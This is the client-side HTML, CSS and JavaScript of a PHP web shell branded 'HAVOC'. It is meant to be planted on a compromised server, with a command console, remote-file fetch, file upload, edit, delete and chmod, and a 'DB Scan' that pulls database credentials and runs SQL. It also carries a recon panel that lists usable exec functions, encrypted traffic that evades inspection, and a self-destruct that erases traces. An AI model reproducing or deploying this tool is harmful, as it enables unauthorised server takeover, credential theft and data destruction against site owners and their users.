.nav input:focus{border-color:var(--ac);box-shadow:0 0 12px rgba(0,230,57,0.08);}
.nav button{border-radius:10px;padding:11px 24px;}
/* Buttons */
button{background:var(--ac);color:#000;border:none;padding:9px 18px;cursor:pointer;font-weight:600;font-size:11px;border-radius:8px;transition:all .2s;font-family:var(--font);letter-spacing:0.3px;}
button:hover{background:var(--ac2);box-shadow:0 0 16px rgba(0,230,57,0.15);transform:translateY(-1px);}
button:active{transform:translateY(0);box-shadow:none;}
/* Breadcrumb */
.path{padding:10px 22px;font-size:11px;color:var(--tx3);border-bottom:1px solid var(--bd);font-family:var(--mono);}
.bc-item{color:var(--ac);cursor:pointer;text-decoration:none;padding:2px 6px;border-radius:6px;transition:all .15s;}
.bc-item:hover{background:rgba(0,230,57,0.08);color:var(--ac2);}
/* Toolbar */
.tool-bar{padding:12px 22px;display:flex;gap:6px;flex-wrap:wrap;align-items:center;border-bottom:1px solid var(--bd);}
.tool-bar button{font-size:10px;padding:7px 14px;border-radius:8px;}
/* Table */
.tbl-wrap{padding:0;}
table{width:100%;border-collapse:collapse;table-layout:fixed;}
th{padding:10px 16px;text-align:left;color:var(--tx3);font-size:10px;text-transform:uppercase;letter-spacing:1.5px;font-weight:600;border-bottom:1px solid var(--bd);}
td{padding:9px 16px;border-bottom:1px solid #161616;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:12px;}
td:last-child{overflow:visible;text-overflow:clip;}
tr{transition:background .12s;}
tr:hover td{background:var(--sf2);}
.dir{color:var(--ac);font-weight:600;cursor:pointer;}
.dir:hover{color:var(--ac2);text-shadow:0 0 8px rgba(0,230,57,0.2);}
.file{color:var(--tx);cursor:pointer;}
.file:hover{color:#fff;}
/* File Actions */
.act{cursor:pointer;color:var(--tx3);font-weight:500;font-size:10px;padding:3px 8px;border:1px solid transparent;border-radius:6px;display:inline-block;margin:0 1px;transition:all .15s;font-family:var(--font);}
.act:hover{color:var(--ac);border-color:var(--bd2);background:rgba(0,230,57,0.05);}
.act-del{color:#554433;}
.act-del:hover{color:var(--red);border-color:#442233;background:rgba(255,51,68,0.05);}
/* Action Dropdown */
.act-drop{display:inline-block;vertical-align:middle;position:relative;}
.act-menu{display:none;position:fixed;background:var(--sf);border:1px solid var(--bd2);border-radius:10px;padding:5px 0;z-index:10000;box-shadow:0 12px 40px rgba(0,0,0,0.6);min-width:135px;backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);}
.act-menu span{display:block;padding:7px 16px;color:var(--tx2);font-size:11px;cursor:pointer;transition:all .12s;font-family:var(--font);white-space:nowrap;}
.act-menu span:hover{background:rgba(0,230,57,0.06);color:var(--ac);}
.act-menu .menu-del{color:#664444;} .act-menu .menu-del:hover{background:rgba(255,51,68,0.06);color:var(--red);}
.act-menu .menu-sep{height:1px;background:var(--bd);margin:4px 0;padding:0;pointer-events:none;}
/* DF Tags */
.df-box{display:flex;flex-wrap:wrap;gap:4px;padding:5px 8px;margin-top:5px;max-height:78px;overflow-y:auto;overflow-x:hidden;background:var(--sf);border:1px solid var(--bd);border-radius:8px;}
.df-box::-webkit-scrollbar{width:3px;} .df-box::-webkit-scrollbar-thumb{background:var(--bd);border-radius:3px;}
.df-tag{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;line-height:1.5;font-family:var(--mono);}
.df-x{background:rgba(255,51,68,0.08);border:1px solid rgba(255,51,68,0.2);color:#ee5566;}
.df-n{background:var(--sf2);border:1px solid var(--bd);color:var(--tx3);}
/* Editor Overlay */
#editor{display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(8,8,8,0.95);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);z-index:9999;flex-direction:column;}
.ed-header{padding:14px 22px;background:var(--sf);border-bottom:1px solid var(--bd);display:flex;justify-content:space-between;align-items:center;}
.ed-label{font-size:10px;color:var(--ac);letter-spacing:3px;text-transform:uppercase;font-weight:700;font-family:var(--mono);}
#ed-wrap{display:flex;flex-grow:1;width:96%;max-width:1400px;margin:14px auto;overflow:hidden;border-radius:12px;border:1px solid var(--bd);box-shadow:0 8px 32px rgba(0,0,0,0.4);}
#ed-lines{margin:0;background:var(--sf);color:var(--tx3);padding:16px 12px 16px 8px;font-family:var(--mono);font-size:13px;line-height:1.7;text-align:right;user-select:none;overflow:hidden;min-width:48px;border-right:1px solid var(--bd);box-sizing:border-box;}
#ed-area{flex-grow:1;background:var(--bg);color:var(--ac);border:none;padding:16px;font-family:var(--mono);font-size:13px;resize:none;outline:none;line-height:1.7;margin:0;width:0;box-sizing:border-box;}
.ed-footer{padding:14px 22px;background:var(--sf);border-top:1px solid var(--bd);display:flex;justify-content:center;gap:12px;}
.ed-footer button{padding:10px 36px;font-size:12px;border-radius:10px;}
#ed-status{font-size:11px;color:var(--tx3);font-family:var(--mono);min-width:120px;}
/* Status bar */
.status-bar{padding:8px 22px;display:flex;justify-content:space-between;font-size:10px;color:var(--tx3);border-top:1px solid var(--bd);font-family:var(--mono);}
/* Search path */
.sr-path{color:var(--tx3);font-size:10px;word-break:break-all;white-space:normal !important;overflow:visible !important;line-height:1.5;}
/* Drag & drop */
.card.drag-over{box-shadow:0 0 0 2px var(--ac),0 20px 60px rgba(0,0,0,0.6) !important;}
/* File type colors */
.ft-php{color:#b39ddb !important;} .ft-js{color:#f0db4f !important;} .ft-css{color:#56b6f7 !important;} .ft-html{color:#e8744f !important;} .ft-json{color:#6d9b6d !important;} .ft-sql{color:#e8a030 !important;} .ft-img{color:#66bb6a !important;} .ft-zip{color:var(--cyan) !important;} .ft-log{color:var(--amber) !important;} .ft-env{color:var(--red) !important;} .ft-conf{color:#d4a05a !important;} .ft-py{color:#5c9fd4 !important;}
/* Loading spinner */
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.brand a.loading{animation:spin .8s linear infinite;display:inline-block;filter:drop-shadow(0 0 16px var(--ac));}
</style>
</head>
<body>
<div class="card">

<div class="header">
<div class="brand"><a href="?">☣︎</a><div class="b-wrap"><span class="b-name">HAVOC</span><span class="b-sub">./0xSec</span></div></div>
<div id="recon-info"></div>
</div>

<div class="term">
<div class="term-bar">
<span class="term-prompt">&#9484;&#9472;&#9472;(<span style="color:var(--ac);">havoc</span><span class="host">&#12951;shell</span>)&#9472;</span>
<span class="term-wc"><span class="wc-min"></span><span class="wc-max"></span><span class="wc-x"></span></span>
</div>
<div class="console" id="out-box">&#9492;&#9472;$ ready</div>
</div>

<div class="nav">
<input type="text" id="cmd-in" placeholder="&#9492;&#9472;$ command  |  sql: query" onkeydown="if(event.keyCode==13) runCmd()">
<button onclick="runCmd()">Execute</button>
</div>

<div class="path" id="path-text">Loading...</div>

<div class="tool-bar">
<button onclick="goUp()" style="background:var(--sf2);color:var(--tx);border:1px solid var(--bd);">..</button>
<button onclick="pMkdir()" style="background:var(--sf2);color:var(--ac);border:1px solid var(--bd);">+ Dir</button>
<button onclick="pMkfile()" style="background:var(--sf2);color:var(--ac);border:1px solid var(--bd);">+ File</button>
<button onclick="pFetch()" style="background:rgba(0,230,57,0.06);color:var(--cyan);border:1px solid rgba(64,232,232,0.15);">&#8595; Fetch</button>
<button onclick="document.getElementById('upl').click()" style="background:var(--sf2);color:var(--tx);border:1px solid var(--bd);">&#8593; Upload</button>
<input type="file" id="upl" style="display:none" onchange="handleUpload()">
<button onclick="api('db_detect')" style="background:rgba(0,230,57,0.08);color:var(--ac);border:1px solid var(--bd2);">&#9673; DB Scan</button>
<button onclick="selfDestruct()" style="background:rgba(255,51,68,0.06);color:var(--red);border:1px solid rgba(255,51,68,0.15);">&#9888; Destruct</button>
<div style="flex-grow:1;"></div>
<input type="text" id="search-in" placeholder="Search..." style="width:160px;flex-grow:0;font-size:11px;background:var(--sf2);border:1px solid var(--bd);color:var(--tx);padding:7px 14px;border-radius:8px;outline:none;font-family:var(--mono);transition:border-color .2s;" onfocus="this.style.borderColor='var(--ac)'" onblur="this.style.borderColor=''" onkeydown="if(event.keyCode==13) doSearch()">
<button onclick="doSearch()" style="background:rgba(0,230,57,0.08);color:var(--ac);border:1px solid var(--bd2);">Find</button>
</div>

<div class="tbl-wrap">
<table>
<thead><tr><th style="width:auto;">Name</th><th style="width:80px;">Size</th><th style="width:140px;">Modified</th><th style="width:70px;">Perm</th><th style="width:26px;">W</th><th style="width:0;padding:0;border:none;"></th></tr></thead>
<tbody id="ls-box"></tbody>
</table>
</div>

<div class="status-bar"><span id="sb-info">Loading...</span><span id="sb-size"></span></div>

</div>

<div id="editor">
<div class="ed-header">
<div id="ed-path" style="color:var(--ac);font-size:12px;font-family:var(--mono);"></div>
<div class="ed-label">Editor</div>
</div>
<div id="ed-wrap">
<pre id="ed-lines"></pre>
<textarea id="ed-area" spellcheck="false"></textarea>
</div>
<div class="ed-footer">
<span id="ed-status">Ln 1, Col 1</span>
<div style="flex-grow:1;"></div>
<button onclick="saveFile()">Save (Ctrl+S)</button>
<button onclick="closeEd()" style="background:rgba(255,51,68,0.08);color:var(--red);border:1px solid rgba(255,51,68,0.2);">Close (Esc)</button>
</div>
</div>

<script>
const _mk = "<?php echo $_mk; ?>";
let curPath = "<?php echo addslashes(str_replace('\\', '/', getcwd())); ?>";
const rootPath = curPath;
let curFile = "";
let fileData = [];
let dbCreds = null;
let cmdHistory = [];
let cmdHistIdx = -1;

function esc(s) { const d = document.createElement('div'); d.appendChild(document.createTextNode(String(s))); return d.innerHTML; }

function ftClass(name) {
    const ext = name.split('.').pop().toLowerCase();
    const m = {php:'ft-php',phtml:'ft-php',js:'ft-js',mjs:'ft-js',ts:'ft-js',jsx:'ft-js',tsx:'ft-js',css:'ft-css',scss:'ft-css',less:'ft-css',html:'ft-html',htm:'ft-html',twig:'ft-html',blade:'ft-html',json:'ft-json',xml:'ft-html',sql:'ft-sql',jpg:'ft-img',jpeg:'ft-img',png:'ft-img',gif:'ft-img',svg:'ft-img',webp:'ft-img',ico:'ft-img',bmp:'ft-img',zip:'ft-zip',gz:'ft-zip',tar:'ft-zip',rar:'ft-zip','7z':'ft-zip',log:'ft-log',txt:'ft-log',env:'ft-env',htaccess:'ft-conf',htpasswd:'ft-conf',conf:'ft-conf',yml:'ft-conf',yaml:'ft-conf',ini:'ft-conf',toml:'ft-conf',py:'ft-py',rb:'ft-py',go:'ft-py',rs:'ft-py',java:'ft-py',sh:'ft-py',bash:'ft-py'};
    return m[ext] || '';
}

function fmtSize(s) {
    if (s === '--') return '--';
    const n = parseInt(s);
    if (isNaN(n)) return String(s);
    if (n < 1024) return n + ' B';
    if (n < 1048576) return (n / 1024).toFixed(1) + ' KB';
    if (n < 1073741824) return (n / 1048576).toFixed(1) + ' MB';
    return (n / 1073741824).toFixed(2) + ' GB';
}

function toB64(buf) {
    const u8 = buf instanceof Uint8Array ? buf : new Uint8Array(buf);
    let bin = '';
    for (let i = 0; i < u8.length; i += 8192) bin += String.fromCharCode.apply(null, u8.subarray(i, i + 8192));
    return btoa(bin);
}

function fromB64(str) {
    const bin = atob(str);
    const u8 = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) u8[i] = bin.charCodeAt(i);
    return u8.buffer;
}

async function deriveKey(salt) {
    const enc = new TextEncoder();
    const material = new Uint8Array([...enc.encode(_mk), ...salt]);
    const hash = await crypto.subtle.digest('SHA-256', material);
    return crypto.subtle.importKey('raw', hash, 'AES-CBC', false, ['encrypt', 'decrypt']);
}

async function aesEnc(text) {
    const enc = new TextEncoder();
    const salt = crypto.getRandomValues(new Uint8Array(16));
    const iv = crypto.getRandomValues(new Uint8Array(16));
    const key = await deriveKey(salt);
    const ct = new Uint8Array(await crypto.subtle.encrypt({name: 'AES-CBC', iv}, key, enc.encode(text)));
    const out = new Uint8Array(32 + ct.length);
    out.set(salt, 0);
    out.set(iv, 16);
    out.set(ct, 32);
    return out;
}

async function aesDec(buf) {
    const d = buf instanceof ArrayBuffer ? buf : buf.buffer;
    const salt = new Uint8Array(d.slice(0, 16));
    const iv = new Uint8Array(d.slice(16, 32));
    const ct = d.slice(32);
    const key = await deriveKey(salt);
    const pt = await crypto.subtle.decrypt({name: 'AES-CBC', iv}, key, ct);
    return new TextDecoder().decode(pt);
}

async function api(action, params = {}) {
    const _logo = document.querySelector('.brand a');
    _logo.classList.add('loading');
    const payload = JSON.stringify({a: action, p: curPath, ...params});
    const encBytes = await aesEnc(payload);
    const fd = new FormData(); fd.append('p_load', toB64(encBytes));

    try {
        const r = await fetch('', { method: 'POST', body: fd });
        const buf = await r.arrayBuffer();
        const b64Res = new TextDecoder().decode(new Uint8Array(buf).slice(16));
        const dec = await aesDec(fromB64(b64Res));

        const res = JSON.parse(dec).r;
        const con = document.getElementById('out-box');

        if(action==='ls') renderLs(res);
        if(action==='recon') renderRecon(res);
        if(action==='search') renderSearch(res);

        if(action==='cmd' || action==='fetch') {
            con.innerText += `\n[${action}]> ${params.c || params.url || ''}\n${res}`;
            con.scrollTop = con.scrollHeight;
            api('ls', {p: curPath});
        }
        if(action==='read') {
            if (typeof res === 'string' && res.startsWith('ERR:')) {
                con.innerText += `\n[read]> ${res}`;
                con.scrollTop = con.scrollHeight;
            } else {
                curFile = params.fp;
                document.getElementById('ed-area').value = res;
                document.getElementById('ed-path').innerText = "EDITING: " + curFile;
                document.getElementById('editor').style.display='flex';
                updateLines();
            }
        }
        if(action === 'dl' && typeof res === 'object' && res.bc) {
            const a = document.createElement('a');
            a.href = 'data:application/octet-stream;base64,' + res.bc;
            a.download = res.fn;
            a.click();
        }
        if(['rm','save','upload','mkdir','mkfile','rename','copy','move','chmod','zip','unzip'].includes(action)) {
            if (typeof res === 'string' && res.startsWith('ERR:')) {
                con.innerText += `\n[${action}]> ${res}`;
                con.scrollTop = con.scrollHeight;
            }
            api('ls', {p: curPath});
        }

        if(action === 'db_detect') {
            if (typeof res === 'object' && res.db) {
                dbCreds = res;
                con.innerText += `\n[DB] Detected: ${res.type} @ ${res.host} | DB: ${res.db} | User: ${res.user} | From: ${res.from}${res.prefix ? ' | Prefix: ' + res.prefix : ''}\n[DB] Ready. Use sql: prefix to query. Example: sql:SHOW TABLES`;
            } else {
                con.innerText += `\n[DB] ${res}`;
            }
            con.scrollTop = con.scrollHeight;
        }

        if(action === 'db_query') {
            if (typeof res === 'object' && res.cols) {
                const cols = res.cols;
                const rows = res.rows;
                let tbl = '\n' + cols.join(' | ');
                tbl += '\n' + cols.map(() => '---').join('-+-');
                rows.forEach(row => { tbl += '\n' + cols.map(c => String(row[c] ?? 'NULL')).join(' | '); });
                tbl += `\n\n${rows.length} row(s)`;
                con.innerText += `\n[sql]> ${params.q}${tbl}`;
            } else {
                con.innerText += `\n[sql]> ${params.q}\n${res}`;
            }
            con.scrollTop = con.scrollHeight;
        }

        if(action === 'selfdestruct') {
            con.innerText += `\n[DESTRUCT] ${res}`;
            con.scrollTop = con.scrollHeight;
            if (res === 'DESTROYED') {
                setTimeout(() => { document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;color:#00e639;font-family:JetBrains Mono,monospace;font-size:16px;letter-spacing:4px;background:#0c0c0c;">Session terminated.</div>'; }, 500);
            }
        }
    } catch(e) { console.error("I/O Severed."); }
    finally { _logo.classList.remove('loading'); }
}

function renderRecon(d) {
    const el = document.getElementById('recon-info');
    const execFns = ['exec','system','shell_exec','passthru','proc_open','popen','pcntl_exec','dl','virtual','fpassthru'];
    const fns = d.df !== 'none' ? d.df.split(',').map(f=>f.trim()).filter(f=>f) : [];
    const tags = fns.map(f => `<span class="df-tag ${execFns.includes(f)?'df-x':'df-n'}">${esc(f)}</span>`).join('');
    const label = fns.length > 0 ? `<span style="color:var(--red);font-size:11px;font-weight:600;margin-right:4px;">disable_functions (${fns.length}):</span>` : '';
    el.innerHTML = `<div style="margin-bottom:3px;font-size:12px;"><span style="color:var(--ac);">${esc(d.u)}</span><span style="color:var(--tx3);">@</span><span style="color:var(--ac2);">${esc(d.h||'')}</span> <span style="color:var(--ac);font-size:16px;vertical-align:middle;line-height:1;">&middot;</span> ${esc(d.s)} <span style="color:var(--ac);font-size:16px;vertical-align:middle;line-height:1;">&middot;</span> PHP ${esc(d.v)} <span style="color:var(--ac);font-size:16px;vertical-align:middle;line-height:1;">&middot;</span> ${esc(d.m)}</div><div class="df-box">${label}${tags||'<span style="color:var(--red);font-size:11px;font-weight:600;margin-right:4px;">disable_functions: </span> <span style="color:var(--tx3);font-size:10px;">none</span>'}</div>`;
}

function renderBreadcrumb(path) {
    const box = document.getElementById('path-text');
    box.innerHTML = "";
    const parts = path.split('/');
    let currentBuild = "";
    parts.forEach((p, i) => {
        if (p === "" && i === 0) {
            currentBuild = "/";
            const span = document.createElement('span');
            span.className = "bc-item";
            span.innerText = "/";
            span.onclick = () => api('ls', {p: '/'});
            box.appendChild(span);
        } else if (p !== "") {
            const sep = document.createElement('span');
            sep.style.cssText = "color:var(--tx3);margin:0 2px;";
            sep.textContent = "/";
            box.appendChild(sep);
            currentBuild += (currentBuild === "/" ? "" : "/") + p;
            const pathTarget = currentBuild;
            const span = document.createElement('span');
            span.className = "bc-item";
            span.innerText = p;
            span.onclick = () => api('ls', {p: pathTarget});
            box.appendChild(span);
        }
    });
}

function renderLs(d) {
    curPath = d.p;
    renderBreadcrumb(curPath);
    fileData = d.i;
    const b = document.getElementById('ls-box'); b.innerHTML = "";
    let dirC = 0, fileC = 0, totalS = 0;
    d.i.forEach((f, idx) => {
        const isD = f.t==='d';
        if (isD) dirC++; else fileC++;
        totalS += parseInt(f.s) || 0;
        const fc = !isD ? ftClass(f.n) : '';
        let menu = `<span data-idx="${idx}" data-act="ren">Rename</span><span data-idx="${idx}" data-act="cpy">Copy</span><span data-idx="${idx}" data-act="mov">Move</span><span data-idx="${idx}" data-act="chm">Permission</span><span data-idx="${idx}" data-act="zip">Zip</span>`;
        if (!isD) menu += `<span data-idx="${idx}" data-act="dl">Download</span>`;
        if (f.n.endsWith('.zip')) menu += `<span data-idx="${idx}" data-act="unzip" style="color:var(--cyan);">Unzip</span>`;
        menu += `<div class="menu-sep"></div><span class="menu-del" data-idx="${idx}" data-act="del">Delete</span>`;
        b.innerHTML += `<tr>
        <td class="${isD?'dir':'file'} ${fc}" data-idx="${idx}" data-act="${isD?'ls':'read'}">${isD?'&#9656;':'&middot;'} ${esc(f.n)}</td>
        <td style="color:var(--tx3);font-size:11px;">${esc(fmtSize(f.s))}</td>
        <td style="color:var(--tx3);font-size:11px;">${esc(f.mt)}</td>
        <td style="color:var(--tx3);font-size:11px;font-family:var(--mono);">${esc(f.pm)}</td>
        <td><span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:${f.w==='Y'?'var(--ac)':'rgba(80,40,40,0.5)'};box-shadow:${f.w==='Y'?'0 0 6px rgba(0,230,57,0.3)':'none'};"></span></td>
        <td style="padding:0;"><div class="act-drop"><div class="act-menu">${menu}</div></div></td>
        </tr>`;
    });
    document.getElementById('sb-info').textContent = `${dirC} folders, ${fileC} files`;
    document.getElementById('sb-size').textContent = fmtSize(totalS);
}

function renderSearch(results) {
    fileData = results;
    const b = document.getElementById('ls-box'); b.innerHTML = "";
    b.innerHTML = `<tr><td colspan="6" style="color:var(--tx2);padding:12px 16px;font-size:12px;">
    <span class="act" data-act="back" style="font-size:12px;cursor:pointer;">&#8592; Back</span>
    &nbsp; Found ${results.length} result${results.length !== 1 ? 's' : ''} (max 100)</td></tr>`;
    results.forEach((f, idx) => {
        const isD = f.t === 'd';
        const fc = !isD ? ftClass(f.n) : '';
        b.innerHTML += `<tr>
        <td class="${isD?'dir':'file'} ${fc}" data-idx="${idx}" data-act="${isD?'ls':'read'}" style="white-space:normal;word-break:break-all;line-height:1.4;" colspan="5">${isD?'&#9656;':'&middot;'} ${esc(f.n)}<br><span class="sr-path">${esc(f.p)}</span></td>
        <td style="padding:0;"><div class="act-drop"><div class="act-menu">
        ${!isD ? `<span data-idx="${idx}" data-act="dl">Download</span>` : ''}
        <span class="menu-del" data-idx="${idx}" data-act="del">Delete</span>
        </div></div></td></tr>`;
    });
    document.getElementById('sb-info').textContent = `${results.length} results`;
    document.getElementById('sb-size').textContent = '';
}

document.getElementById('ls-box').addEventListener('click', function(e) {
    const el = e.target.closest('[data-act]');
    if (!el) return;
    document.querySelectorAll('.act-menu').forEach(m => m.style.display = 'none');
    if (el.dataset.act === 'back') { api('ls', {p: curPath}); return; }
    if (!el.dataset.idx) return;
    const f = fileData[parseInt(el.dataset.idx)];
    if (!f) return;
    switch(el.dataset.act) {
        case 'ls': api('ls', {p: f.p}); break;
        case 'read': api('read', {fp: f.p}); break;
        case 'ren': pRename(f.p, f.n); break;
        case 'cpy': pCopy(f.p); break;
        case 'mov': pMove(f.p); break;
        case 'chm': pChmod(f.p, f.pm); break;
        case 'zip': pZip(f.p); break;
        case 'dl': dlFile(f.p); break;
        case 'unzip': pUnzip(f.p); break;
        case 'del': if(confirm('Delete ' + f.n + ' ?')) api('rm', {fp: f.p}); break;
    }
});
document.addEventListener('click', function(e) {
    if (!e.target.closest('.act-menu')) document.querySelectorAll('.act-menu').forEach(m => { m.style.display='none'; m.style.top=''; m.style.left=''; });
});
window.addEventListener('scroll', function() {
    document.querySelectorAll('.act-menu').forEach(m => { m.style.display='none'; m.style.top=''; m.style.left=''; });
});
document.getElementById('ls-box').addEventListener('contextmenu', function(e) {
    const tr = e.target.closest('tr');
    if (!tr || !tr.querySelector('.act-drop')) return;
    const nameCell = tr.querySelector('.dir, .file');
    if (!nameCell) return;
    e.preventDefault();
    document.querySelectorAll('.act-menu').forEach(m => { m.style.display='none'; });
    const menu = tr.querySelector('.act-menu');
    menu.style.display = 'block';
    let mx = e.clientX, my = e.clientY;
    const mw = menu.offsetWidth, mh = menu.offsetHeight;
    if (mx + mw > window.innerWidth) mx = window.innerWidth - mw - 8;
    if (my + mh > window.innerHeight) my = window.innerHeight - mh - 8;
    menu.style.left = mx + 'px'; menu.style.top = my + 'px';
});

function updateLines() {
    const area = document.getElementById('ed-area');
    const ln = document.getElementById('ed-lines');
    const count = area.value.split('\n').length;
    let nums = '';
    for (let i = 1; i <= count; i++) nums += i + '\n';
    ln.textContent = nums;
}
document.getElementById('ed-area').addEventListener('scroll', function() { document.getElementById('ed-lines').scrollTop = this.scrollTop; });
document.getElementById('ed-area').addEventListener('input', function() { updateLines(); updateEdStatus(); });
document.getElementById('ed-area').addEventListener('keyup', updateEdStatus);
document.getElementById('ed-area').addEventListener('click', updateEdStatus);
document.getElementById('ed-area').addEventListener('keydown', function(e) {
    if (e.key === 'Tab') { e.preventDefault(); const s=this.selectionStart,end=this.selectionEnd; this.value=this.value.substring(0,s)+'    '+this.value.substring(end); this.selectionStart=this.selectionEnd=s+4; updateLines(); }
    if (e.ctrlKey && e.key === 's') { e.preventDefault(); saveFile(); }
    if (e.key === 'Escape') { e.preventDefault(); closeEd(); }
});
function updateEdStatus() {
    const a = document.getElementById('ed-area'), pos = a.selectionStart;
    const t = a.value.substring(0, pos), ln = t.split('\n').length, col = pos - t.lastIndexOf('\n');
    document.getElementById('ed-status').textContent = `Ln ${ln}, Col ${col}`;
}
// Drag & drop upload
const _card = document.querySelector('.card');
_card.addEventListener('dragover', function(e) { e.preventDefault(); this.classList.add('drag-over'); });
_card.addEventListener('dragleave', function(e) { e.preventDefault(); this.classList.remove('drag-over'); });
_card.addEventListener('drop', function(e) {
    e.preventDefault(); this.classList.remove('drag-over');
    const files = e.dataTransfer.files;
    if (!files.length) return;
    Array.from(files).forEach(f => { const r = new FileReader(); r.onload = () => api('upload', {fn: f.name, bc: toB64(new Uint8Array(r.result))}); r.readAsArrayBuffer(f); });
});

function goUp() { api('ls', {p: curPath.substring(0, curPath.lastIndexOf('/')) || '/'}); }
function runCmd() {
    const i = document.getElementById('cmd-in');
    const v = i.value.trim();
    if (!v) return;
    cmdHistory.push(v);
    cmdHistIdx = cmdHistory.length;
    i.value = '';
    if (v.startsWith('sql:')) {
        const q = v.substring(4).trim();
        if (!q) return;
        if (!dbCreds) {
            const con = document.getElementById('out-box');
            con.innerText += '\n[DB] No credentials. Click DB DETECT first.';
            con.scrollTop = con.scrollHeight;
            return;
        }
        api('db_query', {host: dbCreds.host || 'localhost', user: dbCreds.user, pass: dbCreds.pass, db: dbCreds.db, q: q});
    } else {
        api('cmd', {c: v});
    }
}
document.getElementById('cmd-in').addEventListener('keydown', function(e) {
    if (e.key === 'ArrowUp') { e.preventDefault(); if (cmdHistIdx > 0) { cmdHistIdx--; this.value = cmdHistory[cmdHistIdx]; } }
    if (e.key === 'ArrowDown') { e.preventDefault(); if (cmdHistIdx < cmdHistory.length - 1) { cmdHistIdx++; this.value = cmdHistory[cmdHistIdx]; } else { cmdHistIdx = cmdHistory.length; this.value = ''; } }
});
function pMkdir() { const n = prompt("New Folder Name:"); if(n) api('mkdir', {n: n}); }
function pMkfile() { const n = prompt("New File Name:"); if(n) api('mkfile', {n: n}); }
function pFetch() {
    const u = prompt("Remote URL:");
    const n = prompt("Save as Name:");
    if(u && n) api('fetch', {url: u, fn: n});
}
function saveFile() { api('save', {fp: curFile, c: document.getElementById('ed-area').value}).then(()=>closeEd()); }
function closeEd() { document.getElementById('editor').style.display='none'; }
function handleUpload() {
    const f = document.getElementById('upl').files[0];
    const r = new FileReader();
    r.onload = () => api('upload', {fn: f.name, bc: toB64(new Uint8Array(r.result))});
    r.readAsArrayBuffer(f);
}
function pRename(fp, oldN) {
    const n = prompt("Rename Object:", oldN);
    if (n && n !== oldN) api('rename', {fp: fp, new_n: n});
}
function pCopy(fp) {
    const dst = prompt("Copy to directory:", curPath);
    if (dst) api('copy', {fp: fp, dst: dst});
}
function pMove(fp) {
    const dst = prompt("Move to directory:", curPath);
    if (dst) api('move', {fp: fp, dst: dst});
}
function pChmod(fp, cur) {
    const mode = prompt("Set Permission (e.g. 0755):", cur);
    if (mode) api('chmod', {fp: fp, mode: mode});
}
function dlFile(fp) { api('dl', {fp: fp}); }
function pZip(fp) { api('zip', {fp: fp}); }
function pUnzip(fp) { api('unzip', {fp: fp}); }
function doSearch() {
    const raw = document.getElementById('search-in').value.trim();
    if (!raw) return;
    const isGrep = raw.startsWith('>');
    const q = isGrep ? raw.substring(1).trim() : raw;
    if (!q) return;
    api('search', {q: q, type: isGrep ? 'content' : 'name', p: rootPath});
}
function selfDestruct() {
    if (!confirm('SELF-DESTRUCT: This will permanently delete the file manager from the server. Continue?')) return;
    if (prompt('Type CONFIRM to proceed:') !== 'CONFIRM') return;
    api('selfdestruct');
}
api('recon'); api('ls');
</script>
</body>
</html>
